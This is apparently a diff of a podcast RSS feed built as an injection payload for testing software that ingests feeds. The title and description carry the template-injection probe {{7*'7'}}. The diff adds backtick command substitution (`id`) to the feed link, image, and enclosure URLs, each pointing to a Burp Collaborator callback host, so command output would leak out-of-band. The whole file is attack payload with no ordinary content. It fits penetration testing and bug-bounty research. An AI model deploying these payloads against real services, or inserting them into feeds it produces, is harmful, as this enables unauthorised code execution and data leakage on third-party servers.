@@ -2,10 +2,10 @@
     <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
       <channel>
         <title>{{7*'7'}}</title>
-        <link>https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net</link>
+        <link>https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net/?`id`</link>
         <description>{{7*'7'}}</description>
         <language>en</language>
-        <itunes:image href="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net/"/>
+        <itunes:image href="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net/?`id`"/>
         <itunes:explicit>true</itunes:explicit>
         <itunes:owner>
         <itunes:email>ajdumanhug@7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net</itunes:email>
@@ -13,8 +13,8 @@
         <item>
           <title>A Legend Is Born</title>
           <description>How to code 10x faster with 10x more bugs</description>
-          <enclosure url="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net" length="12345" type="audio/mpeg"/>
-          <itunes:image href="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net" />
+          <enclosure url="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net/?`id`" length="12345" type="audio/mpeg"/>
+          <itunes:image href="https://7dlztayjg768k8xbz7uo2h1a319wxl.burpcollaborator.net/?`id`" />
           <pubDate>Fri, 06 Apr 1984 00:00:01 GMT</pubDate>
           <guid>684CFFCD-CFA0-FACE-B00C-2F5473246A72</guid>
           <itunes:explicit>true</itunes:explicit>
